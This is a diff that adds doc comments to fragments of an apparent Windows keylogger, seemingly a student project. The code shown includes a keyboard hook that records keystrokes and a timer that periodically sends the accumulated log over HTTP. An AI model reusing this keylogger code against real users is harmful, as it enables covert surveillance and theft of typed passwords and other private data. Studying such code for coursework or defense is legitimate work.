@@ -13,6 +13,10 @@ Geoffrey Kanteles gdk7676@rit.edu
 #include "RunThread.h"
 
 std::string keylog = "";
+/**
+    Sets log to write to, reports empty file
+    @return
+*/
 void TimerSendHTTP()
 {
     if(keylog.empty())
@@ -30,6 +34,16 @@ RunThread HTTPTimer(TimerSendHTTP, 500 * 60, RunThread::Infinite);
 
 HHOOK eHook = NULL;
 
+/**
+    Take Windows system info on key press and
+    writes to log based on position data:
+    [shift] for key down vs. [/shift] for key up
+    Then calls next hook for next key press.
+    @param nCode to track when to call next hook
+    @param wparam for state information
+    @param lparam to pass to next hook
+    @return a call to the next hook
+*/
 LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 {
     if(nCode < 0)
@@ -57,7 +71,11 @@ LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 
     return CallNextHookEx(eHook, nCode, wparam, lparam);
 }
-
+/**
+    Sets system hook and starts the timer
+    @return True if the hook does not exist,
+    False if it does exist.
+*/
 bool InstallHook()
 {
     Helper::WriteAppLog("Hook started... Timer started");
